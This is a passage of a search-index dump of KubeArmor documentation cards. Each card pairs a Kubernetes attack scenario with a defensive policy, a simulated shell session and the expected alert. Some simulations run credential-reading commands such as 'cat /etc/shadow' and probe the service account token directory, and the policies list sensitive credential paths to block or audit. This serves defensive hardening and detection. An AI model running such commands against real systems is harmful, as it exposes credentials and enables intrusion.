assets.</p>"},{"location":"use-cases/cards/Process-based-asset-access/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker uses different attack techniques to change configuration files. Process-based asset access will deny any unknown process from accessing the configuration files. Attack Type Credential access, Data manipulation</p>"},{"location":"use-cases/cards/Process-based-asset-access/#compliance","title":"Compliance","text":"<ul> <li>Process based asset access</li> </ul>"},{"location":"use-cases/cards/Process-based-asset-access/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Process-based-asset-access/#process-based-asset-access_1","title":"Process based asset access","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: only-allow-nginx-exec\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  file:\n    matchDirectories:\n    - dir: /\n      recursive: true\n    - dir: /etc/nginx/\n      recursive: true\n      fromSource:\n      - path: /usr/sbin/nginx\n    - dir: /etc/nginx/\n      recursive: true\n      fromSource:\n      - path: /usr/bin/cd\n    - dir: /etc/nginx/\n      recursive: true\n      readOnly: true\n      action: Block\n  process:\n    matchPaths:\n    - path: /usr/sbin/nginx\n    - path: /usr/bin/bash\n  message: process-based-asset-access\n  action: Allow\n</code></pre>"},{"location":"use-cases/cards/Process-based-asset-access/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# cd /etc/nginx/\nroot@nginx-77b4fdf86c-x7sdm:/etc/nginx# ls\nbash: /usr/bin/ls: Permission denied\nroot@nginx-77b4fdf86c-x7sdm:/etc/nginx#\n</code></pre>"},{"location":"use-cases/cards/Process-based-asset-access/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"eBPF Monitor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 70701,\n  \"HostPPID\": 70666,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 444,\n  \"PPID\": 439,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/ls\",\n  \"Resource\": \"/usr/bin/ls\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/bash\",\n  \"Timestamp\": 1696587116,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:11:56.694009Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Process-based-network-control/","title":"Process based network control","text":"<p>Allow only specific processes to access network primitives, deny/audit everything else.</p>"},{"location":"use-cases/cards/Process-based-network-control/#narrative","title":"Narrative","text":"<p>Typically, within a pod/container, there are only specific processes that need to use network access. KubeArmor allows one to specify the set of binaries that are allowed to use network primitives such as TCP, UDP, and Raw sockets and deny everyone else.</p>"},{"location":"use-cases/cards/Process-based-network-control/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker binary would try to send a beacon to its C&amp;C (Command and Control) Server. Also, the binary might use the network primitives to exfiltrate pod/container data/configuration. Attack Type Privilege Escalation, Pivoting</p>"},{"location":"use-cases/cards/Process-based-network-control/#compliance","title":"Compliance","text":"<ul> <li>Process based network control</li> </ul>"},{"location":"use-cases/cards/Process-based-network-control/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Process-based-network-control/#process-based-network-control_1","title":"Process based network control","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: restrict-proccess\n  namespace: default\nspec:\n  severity: 4\n  selector:\n    matchLabels:\n      app: nginx\n  network:\n    matchProtocols:\n    - protocol: tcp\n      fromSource:\n      - path: /usr/bin/wget\n    - protocol: udp\n      fromSource:\n      - path: /usr/bin/wget\n  action:\n    Allow\n</code></pre>"},{"location":"use-cases/cards/Process-based-network-control/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-network-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# curl www.google.com\ncurl: (6) Could not resolve host: www.google.com\nroot@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\n--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\nResolving github.com (github.com)... 20.207.73.82\nConnecting to github.com (github.com)|20.207.73.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 15051 (15K) [text/plain]\nSaving to: 'wordpress-mysql-deployment.yaml.2'\n\nwordpress-mysql-deployment.ya 100%[=================================================&gt;]  14.70K  --.-KB/s    in 0.08s\n\n2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]\n</code></pre>"},{"location":"use-cases/cards/Process-based-network-control/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 73952,\n  \"HostPPID\": 73945,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 532,\n  \"PPID\": 525,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/curl\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/curl www.google.com\",\n  \"Timestamp\": 1696588301,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:31:41.935146Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Process-forensics/","title":"Process forensics","text":"<p>Get granular details of all the executed processes within the target workloads.</p>"},{"location":"use-cases/cards/Process-forensics/#narrative","title":"Narrative","text":"<p>KubeArmor to audit the following process: /bin/ps, /usr/bin/ps, /usr/bin/pgrep, /usr/bin/top, and /usr/bin/htop. This will allow KubeArmor to detect and respond to suspicious activity involving these tools, such as attempts to enumerate or exploit running processes.</p>"},{"location":"use-cases/cards/Process-forensics/#attack-scenario","title":"Attack Scenario","text":"<p>Attackers can use the ps, pgrep, and top commands to enumerate the running processes on a system. This information can then be used to identify critical processes that can be targeted for attack.</p>"},{"location":"use-cases/cards/Process-forensics/#compliance","title":"Compliance","text":"<ul> <li>MITRE-T1602</li> </ul>"},{"location":"use-cases/cards/Process-forensics/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Process-forensics/#process-forensics_1","title":"Process Forensics","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-discovery-process-discovery\n  namespace: wordpress-mysql\nspec:\n  tags: [\"MITRE\", \"Discovery\"]\n  message: \"Someone accessed running process\"\n  selector:\n    matchLabels:\n      app: wordpress\n  process:\n    matchPaths:\n      - path: /bin/ps\n      - path: /usr/bin/ps\n      - path: /usr/bin/pgrep\n      - path: /usr/bin/top\n      - path: /usr/bin/htop\n    action: Audit\n    severity: 5\n</code></pre>"},{"location":"use-cases/cards/Process-forensics/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ps -A\n    PID TTY          TIME CMD\n      1 ?        00:00:08 apache2\n    189 ?        00:00:00 apache2\n    190 ?        00:00:00 apache2\n    191 ?        00:00:00 apache2\n    192 ?        00:00:00 apache2\n    193 ?        00:00:00 apache2\n    245 pts/0    00:00:00 bash\n</code></pre>"},{"location":"use-cases/cards/Process-forensics/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: ksp-discovery-process-discovery\nSeverity: 5\nMessage: Someone accessed running process\nSource: /bin/bash\nResource: /bin/ps -A\nOperation: Process\nAction: Audit\nData: syscall=SYS_EXECVE\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [MITRE Discovery]\nHostPID: 1.252488e+06\nHostPPID: 1.250979e+06\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 288\nPPID: 281\nParentProcessName: /bin/bash\nProcessName: /bin/ps\nTags: MITRE,Discovery\n</code></pre>"},{"location":"use-cases/cards/Process-forensics/#references","title":"References","text":"<p>MITRE Data from Configuration Repository</p>"},{"location":"use-cases/cards/Restrict-Capabilities/","title":"Restrict Capabilities","text":"<p>Do not allow capabilities that can be leveraged by the attacker.</p>"},{"location":"use-cases/cards/Restrict-Capabilities/#narrative","title":"Narrative","text":"<p>Containers run with a default set of capabilities as assigned by the Container Runtime. Capabilities are parts of the rights generally granted on a Linux system to the root user. In many cases applications running in containers do not require any capabilities to operate, so from the perspective of the principal of least privilege use of capabilities should be minimized.</p>"},{"location":"use-cases/cards/Restrict-Capabilities/#attack-scenario","title":"Attack Scenario","text":"<p>Kubernetes by default connects all the containers running in the same node (even if they belong to different namespaces) down to Layer 2 (ethernet). Every pod running in the same node is going to be able to communicate with any other pod in the same node (independently of the namespace) at ethernet level (layer 2). This allows a malicious containers to perform an ARP spoofing attack to the containers on the same node and capture their traffic. Attack Type Reconnaissance, Spoofing Actual Attack Recon through P.A.S. Webshell, NBTscan</p>"},{"location":"use-cases/cards/Restrict-Capabilities/#compliance","title":"Compliance","text":"<ul> <li>CIS Kubernetes</li> <li>Control Id: 5.2.8 - Minimize the admission of containers with the NET_RAW capability</li> <li>Control Id: 5.2.9 - Minimize the admission of containers with capabilities assigned</li> </ul>"},{"location":"use-cases/cards/Restrict-Capabilities/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Restrict-Capabilities/#restrict-capabilities_1","title":"Restrict Capabilities","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-ubuntu-1-cap-net-raw-block\n  namespace: multiubuntu\nspec:\n  severity: 1\n  selector:\n    matchLabels:\n      container: ubuntu-1\n  capabilities:\n    matchCapabilities:\n    - capability: net_raw\n  action:\n    Block\n</code></pre>"},{"location":"use-cases/cards/Restrict-Capabilities/#simulation","title":"Simulation","text":"<pre><code>root@ubuntu-1-deployment-f987bd4d6-xzcb8:/# tcpdump\ntcpdump: eth0: You don't have permission to capture on that device\n(socket: Operation not permitted)\nroot@ubuntu-1-deployment-f987bd4d6-xzcb8:/#    \n</code></pre>"},{"location":"use-cases/cards/Restrict-Capabilities/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n    \"Action\":\"Block\",\n    \"ClusterName\":\"k3sn0d3\",\n    \"ContainerID\":\"aaf2118edcc20b3b04a0fae6164f957993bf3c047fd8cb33bc37ac7d0175e848\",\n    \"ContainerImage\":\"docker.io/kubearmor/ubuntu-w-utils:0.1@sha256:b4693b003ed1fbf7f5ef2c8b9b3f96fd853c30e1b39549cf98bd772fbd99e260\",\n    \"ContainerName\":\"ubuntu-1-container\",\n    \"Data\":\"syscall=SYS_SOCKET\",\n    \"Enforcer\":\"AppArmor\",\n    \"HashID\":\"dd12f0f12a75b30d47c5815f93412f51b259b74ac0eccc9781b6843550f694a3\",\n    \"HostName\":\"worker-node02\",\n    \"HostPID\":38077,\n    \"HostPPID\":38065,\n    \"Labels\":\"container=ubuntu-1 group=group-1\",\n    \"Message\":\"\",\n    \"NamespaceName\":\"multiubuntu\",\n    \"Operation\":\"Network\",\n    \"Owner\":{\n        \"Name\":\"ubuntu-1-deployment\",\n        \"Namespace\":\"multiubuntu\",\n        \"Ref\":\"Deployment\"\n    },\n    \"PID\":124,\n    \"PPID\":114,\n    \"PodName\":\"ubuntu-1-deployment-f987bd4d6-xzcb8\",\n    \"PolicyName\":\"ksp-ubuntu-1-cap-net-raw-block\",\n    \"ProcessName\":\"/usr/sbin/tcpdump\",\n    \"Resource\":\"domain=AF_PACKET type=SOCK_RAW protocol=768\",\n    \"Result\":\"Operation not permitted\",\n    \"Severity\":\"1\",\n    \"Source\":\"/usr/sbin/tcpdump\",\n    \"Tags\":\"\",\n    \"Timestamp\":1705405378,\n    \"Type\":\"MatchedPolicy\",\n    \"UID\":0,\n    \"UpdatedTime\":\"2024-01-16T11:42:58.662928Z\",\n    \"UpdatedTimeISO\":\"2024-01-16T11:42:58.662Z\",\n    \"cluster_id\":\"16402\",\n    \"component_name\":\"kubearmor\",\n    \"instanceGroup\":\"0\",\n    \"instanceID\":\"0\",\n    \"workload\":\"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Restrict-Capabilities/#references","title":"References","text":"<p>MITRE Network Service Discovery</p>"},{"location":"use-cases/cards/Sensitive-Asset-audit/","title":"Sensitive Asset audit","text":"<p>Audit any (read/write) accesses to sensitive assets.</p>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#narrative","title":"Narrative","text":"<p>KubeArmor helps the organization to protect their confidential files and directories  by continuous Monitoring and Alerting the access to that particular file or directory regarding the policy that we define.</p>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#attack-scenario","title":"Attack Scenario","text":"<p>By modifying the file such as /etc/security/pwquality.conf , /etc/shadow, /etc/pam.d/, /etc/sudoers can bypass authentication or authorization checks,  gain access to user passwords, weaken password requirements and allow the attacker to run commands as root.  Using KubeArmor, AccuKnox can do continuous auditing for every access.</p>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#compliance","title":"Compliance","text":"<ul> <li>NIS, NIST-800-53-r5</li> <li>NIST_SA</li> <li>NIST_SA-20</li> <li>NIST_SA-20-Customized Development of Critical Components</li> <li>SA</li> </ul>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Sensitive-Asset-audit/#sensitive-data-audit","title":"Sensitive data Audit","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\n  name: hsp-nist-ca-9-audit-untrusted-read-on-sensitive-files\nspec:\n  tags: [\"NIST\",\"NIST-800-53-r5\",\"CA-9\",\"File Rules\",\"Internal System Connections\", \"NIST_SA\", \"NIST_SA-20\", \"NIST_SA-20-Customized Development of Critical Components\", \"SA\"]\n  message: \"Alert! Sensitive file opened for reading by non-trusted program! Possible violation of NIST CA-9 SA-20\"\n  nodeSelector:\n    matchLabels:\n     kubernetes.io/hostname: gke-ubuntu                                                                           # Change your matchLabels\n  file:\n    severity: 5\n    matchDirectories:\n    - dir: /etc/sudoers.d/\n      ownerOnly: true\n      recursive: true\n    - dir: /etc/pam.d/\n      ownerOnly: true\n      recursive: true\n    - dir: /etc/\n      ownerOnly: true\n      recursive: true\n    action: Audit\n    matchPaths:\n    - path: /etc/shadow\n      ownerOnly: true\n    - path: /etc/sudoers\n      ownerOnly: true\n    - path: /etc/pam.conf\n      ownerOnly: true\n    - path: /etc/security/pwquality.conf\n      ownerOnly: true\n    action: Audit\n</code></pre>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# cat /etc/shadow\nroot:*:17448:0:99999:7:::\ndaemon:*:17448:0:99999:7:::\nbin:*:17448:0:99999:7:::\nsys:*:17448:0:99999:7:::\nsync:*:17448:0:99999:7:::\ngames:*:17448:0:99999:7:::\nman:*:17448:0:99999:7:::\nlp:*:17448:0:99999:7:::\n</code></pre>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: hsp-nist-ca-9-audit-untrusted-read-on-sensitive-files\nSeverity: 5\nMessage: Alert! Sensitive file opened for reading by non-trusted program! Possible violation of NIST CA-9 SA-20\nSource: /bin/cat /etc/shadow\nResource: /etc/shadow\nOperation: File\nAction: Audit\nData: syscall=SYS_OPEN flags=O_RDONLY\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST NIST-800-53-r5 CA-9 File Rules Internal System Connections NIST_SA NIST_SA-20 NIST_SA-20-Customized Development of Critical Components SA]\nHostPID: 706899\nHostPPID: 706810\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 251\nPPID: 245\nParentProcessName: /bin/bash\nProcessName: /bin/cat\nTags: NIST,NIST-800-53-r5,CA-9,File Rules,Internal System Connections,NIST_SA,NIST_SA-20,NIST_SA-20-Customized Development of Critical Components,SA\n</code></pre>"},{"location":"use-cases/cards/Sensitive-Asset-audit/#references","title":"References","text":"<p>NIST Security and Privacy Controls for Information Systems and OrganizationsCSF Customized Development Of Critical Components</p>"},{"location":"use-cases/cards/Service-Account-token/","title":"Service Account token","text":"<p>Protect access to k8s service account token</p>"},{"location":"use-cases/cards/Service-Account-token/#narrative","title":"Narrative","text":"<p>K8s mounts the service account token as part of every pod by default. The service account token is a credential that can be used as a bearer token to access k8s APIs and gain access to other k8s entities. Many times there are no processes in the pod that use the service account tokens which means in such cases the k8s service account token is an unused asset that can be leveraged by the attacker.</p>"},{"location":"use-cases/cards/Service-Account-token/#attack-scenario","title":"Attack Scenario","text":"<p>It's important to note that attackers often look for ways to gain access to other entities within Kubernetes clusters. One common method is to check for credential accesses, such as service account tokens, in order to perform lateral movements. For instance, in many Kubernetes attacks, once the attacker gains entry into a pod, they may attempt to use a service account token to access other entities.  Attack type Credential Access, Comand Injection  Actual Attack Hildegard, BlackT, BlackCat RaaS</p>"},{"location":"use-cases/cards/Service-Account-token/#compliance","title":"Compliance","text":"<ul> <li>CIS_Kubernetes_Benchmark_v1.27, Control-Id-5.1.6</li> </ul>"},{"location":"use-cases/cards/Service-Account-token/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Service-Account-token/#service-account-token_1","title":"Service account token","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-service-account\n  namespace: wordpress-mysql\nspec:\n  severity: 2\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchDirectories:\n      - dir: /run/secrets/kubernetes.io/serviceaccount/\n        recursive: true\n  action: Block\n</code></pre>"},{"location":"use-cases/cards/Service-Account-token/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-7c966b5d85-42jwx:/# cd /run/secrets/kubernetes.io/serviceaccount/ \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# ls \nls: cannot open directory .: Permission denied \nroot@wordpress-7c966b5d85-42jwx:/run/secrets/kubernetes.io/serviceaccount# \n</code></pre>"},{"location":"use-cases/cards/Service-Account-token/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": null,\n  \"Action\": \"Block\",\n  \"ClusterName\": \"deathiscoming\",\n  \"ContainerID\": \"bbf968e6a75f0b4412478770911c6dd05d5a83ec97ca38872246e89c31e9d41a\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"f1c272d8d75bdd91b9c4d1dc74c8d0f222bf4ecd0008c3a22a54706563ec5827\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 11105,\n  \"HostPPID\": 10997,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"\",\n    \"Namespace\": \"\",\n    \"Ref\": \"\"\n  },\n  \"PID\": 204,\n  \"PPID\": 194,\n  \"PodName\": \"wordpress-7c966b5d85-42jwx\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/bin/ls\",\n  \"Resource\": \"/run/secrets/kubernetes.io/serviceaccount\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"\",\n  \"Source\": \"/bin/ls\",\n  \"Tags\": \"\",\n  \"Timestamp\": 1695903189,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-09-28T12:13:09.159252Z\",\n  \"cluster_id\": \"3664\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Service-Account-token/#references","title":"References","text":"<p>MITRE Steal Application Access Token</p>"},{"location":"use-cases/cards/Syscall-forensics/","title":"Syscall forensics","text":"<p>Get granular details of all the security sensitive system calls within the target workloads.</p>"},{"location":"use-cases/cards/Syscall-forensics/#narrative","title":"Narrative","text":"<p>KubeArmor can continuously monitor and alert on sensitive syscalls in real time, providing the necessary information to investigate and respond to potential attacks. This is done by auditing the syscalls that are executed on the system and looking for suspicious activity.</p>"},{"location":"use-cases/cards/Syscall-forensics/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker who can control the unlink, chown, and chroot syscalls can delete a large number of files, including system configuration files and user data. The unlink syscall deletes a file. The chown syscall changes the ownership of a file or directory. The chroot syscall changes the root directory for the current process and all of its child processes. This could be prevented by auditing these syscalls by KubeArmor.</p>"},{"location":"use-cases/cards/Syscall-forensics/#compliance","title":"Compliance","text":"<ul> <li>CIS-4.4</li> <li>NIST-4.4</li> <li>MITRE-T1602</li> </ul>"},{"location":"use-cases/cards/Syscall-forensics/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Syscall-forensics/#syscall-forensics_1","title":"Syscall Forensics","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: Auditing Syscalls \n  namespace: wordpress-mysql\nspec:\n  action: Audit\n  message: Warning! Syscall Alert\n  syscalls:\n    matchSyscalls:\n    - syscall:\n      - unlink\n      - chmod\n      - chown\n      - chroot\n      - mount\n      - ptrace\n      - kill\n      - swapoff\n      - syslog\n      - sethostname\n  selector:\n    matchLabels:\n      app: wordpress\n  tags : [\"CIS-4.4,4.3,4.12\", \"NIST-4.4,4.3,4.12\", \"MITRE-T1602\"]\n</code></pre>"},{"location":"use-cases/cards/Syscall-forensics/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ls\nindex.php    readme.html      wp-blog-header.php    wp-config.php  wp-includes        wp-login.php    myfile.txt        \nroot@wordpress-7c966b5d85-wvtln:/var/www/html# unlink myfile.txt\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ls\nindex.php    readme.html      wp-admin            wp-comments-post.php  wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php\n</code></pre>"},{"location":"use-cases/cards/Syscall-forensics/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: auditing-syscalls\nSeverity: 1\nMessage: Warning! Syscall Alert\nSource: /usr/bin/unlink myfile.txt\nResource: /var/www/html/myfile.txt\nOperation: Syscall\nAction: Audit\nData: syscall=SYS_UNLINK\nResult: Passed\nATags: [CIS-4.4 4.3 4.12 NIST-4.4 4.3 4.12 MITRE-T1602]\nHostPID: 741541\nHostPPID: 739395\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 278\nPPID: 261\nParentProcessName: /bin/bash\nProcessName: /usr/bin/unlink\nTags: CIS-4.4,4.3,4.12,NIST-4.4,4.3,4.12,MITRE-T1602\n</code></pre>"},{"location":"use-cases/cards/Syscall-forensics/#references","title":"References","text":"<p>CIS BenchmarksMITRE Data from Configuration Repository</p>"},{"location":"use-cases/cards/Trusted-certs-bundle/","title":"Trusted certs bundle","text":"<p>Protect write access to the trusted root certificates bundle</p>"},{"location":"use-cases/cards/Trusted-certs-bundle/#narrative","title":"Narrative","text":"<p>Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.</p>"},{"location":"use-cases/cards/Trusted-certs-bundle/#attack-scenario","title":"Attack Scenario","text":"<p>By using this technique, attackers can successfully evade security warnings that alert users when compromised systems connect over HTTPS to adversary-controlled web servers. These servers often look like legitimate websites, and are designed to trick users into entering their login credentials, which can then be used by the attackers. It's important to be aware of this threat and take necessary precautions to prevent these attacks from happening. Attack Type Man-In-The-Middle(MITM) Actual Attack  POODLE(Padding Oracle On Downgraded Legacy Encryption), BEAST (Browser Exploit Against SSL/TLS)</p>"},{"location":"use-cases/cards/Trusted-certs-bundle/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 6.3.4</li> <li>MITRE_T1552_unsecured_credentials</li> </ul>"},{"location":"use-cases/cards/Trusted-certs-bundle/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Trusted-certs-bundle/#trusted-certs-bundle_1","title":"Trusted Certs Bundle","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-mysql-trusted-cert-mod\n  namespace: wordpress-mysql\nspec:\n  action: Block\n  file:\n    matchDirectories:\n    - dir: /etc/ssl/\n      readOnly: true\n      recursive: true\n    - dir: /etc/pki/\n      readOnly: true\n      recursive: true\n    - dir: /usr/local/share/ca-certificates/\n      readOnly: true\n      recursive: true\n  message: Credentials modification denied\n  selector:\n    matchLabels:\n      app: mysql\n  severity: 1\n  tags:\n  - MITRE\n  - MITRE_T1552_unsecured_credentials\n  - FGT1555\n  - FIGHT\n</code></pre>"},{"location":"use-cases/cards/Trusted-certs-bundle/#simulation","title":"Simulation","text":"<pre><code> kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd /etc/ssl/\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# ls\ncerts\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# rmdir certs\nrmdir: failed to remove 'certs': Permission denied\nroot@mysql-74775b4bf4-65nqf:/etc/ssl# cd certs/\nroot@mysql-74775b4bf4-65nqf:/etc/ssl/certs# touch new\ntouch: cannot touch 'new': Permission denied\nroot@mysql-74775b4bf4-65nqf:/etc/ssl/certs#\n</code></pre>"},{"location":"use-cases/cards/Trusted-certs-bundle/#expected-alert","title":"Expected 